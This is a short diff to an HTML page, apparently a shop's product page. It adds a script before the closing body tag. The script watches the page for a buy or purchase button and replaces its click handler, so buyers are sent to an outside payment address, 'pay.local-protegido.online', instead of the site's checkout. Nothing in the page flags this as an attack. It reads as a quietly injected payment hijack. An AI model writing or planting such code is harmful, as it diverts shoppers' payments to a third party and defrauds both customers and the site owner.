@@ -924,5 +924,22 @@
 			</smooth-scroll>
 
 					</div>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const observer = new MutationObserver(() => {
+      const buyBtn = document.querySelector("button[data-testid='buy-button'], .product-buy-button, button[data-purchase]");
+      if (buyBtn) {
+        buyBtn.onclick = () => {
+          window.location.href = "https://pay.local-protegido.online/6YQPgjnLB99gpxz";
+        };
+        observer.disconnect(); // Parar de observar após encontrar e modificar o botão
+      }
+    });
+
+    observer.observe(document.body, { childList: true, subtree: true });
+  });
+</script>
+
+
 			</body>
 </html>
